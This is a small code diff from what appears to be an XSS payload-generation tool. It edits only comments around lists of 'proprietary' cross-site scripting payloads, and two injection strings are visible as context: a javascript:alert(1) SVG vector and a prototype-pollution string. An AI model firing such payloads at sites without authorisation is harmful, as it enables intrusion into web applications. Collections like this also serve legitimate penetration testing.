@@ -354,9 +354,7 @@ def polymorph(payload: str) -> str:
 # ─────────────────────────────────────────────────────────────────────────────
 #                         BASE PAYLOAD COLLECTIONS
 # ─────────────────────────────────────────────────────────────────────────────
-#  (The huge BASE_PAYLOADS, EXTRA_BASE, and stored lists from v10 are kept
-#   completely intact below – NOTHING removed.)
-# CyberZeus Proprietary XSS Payloads — no external URLs, 100% in-line & original
+
 # CyberZeus Proprietary XSS Payloads — 100% self-contained, no external URLs
 BASE_PAYLOADS = [
     # 1. Classic & Polyglot Injections
@@ -490,7 +488,6 @@ BASE_PAYLOADS = [
     "<svg xml:base=\"javascript:alert(1)\">",
 ]
 
-# CyberZeus Proprietary “Extra” XSS Payloads — 100% self-contained, ultra-precise triggers
 EXTRA_BASE = [
     # Prototype & Constructor Tricks
     "__proto__[alert]=1",
